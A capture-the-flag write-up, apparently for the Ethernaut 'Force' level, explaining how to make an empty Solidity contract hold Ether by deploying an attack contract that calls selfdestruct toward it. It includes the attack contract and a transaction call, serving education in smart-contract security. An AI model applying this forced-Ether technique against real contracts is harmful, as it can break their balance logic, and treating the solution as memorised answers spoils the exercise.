# Description

Some contracts will simply not take your money `¯\_(ツ)_/¯`

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

- Fallback methods
- Sometimes the best way to attack a contract is with another contract.
- See the Help page above, section "Beyond the console"

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

# Notes

- To solve this challenge, we must send money to the contract, which in itself is a challenge, because there are no payable functions defined here, so we must look elsewhere.
- The idea is to use the `selfdestruct(address)` low-level opcode call which lets you abandon your smart contract and move all remaining Ethers to another address.
- we can do just that with the attack contract defined bellow :
```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract AttackContract {

    function collect() public payable returns(uint) {
        return address(this).balance;
    }

    function attack() public {
        address addr = 0x9775aD95cf21c7737c2f4B2408106a583E811021;
        selfdestruct(payable(addr));
    }

}
```

we send ethers to the attack contract like so :
```
await sendTransaction({
  from: player,
  to: "0x72AF8e8F223F9c4eEC7d23c8171B60aeEd6E0d47",
  data: "0xbd4852e20000000000000000000000000000000000000000000000000000000000000000",
  value: toWei('0.0005')
});
```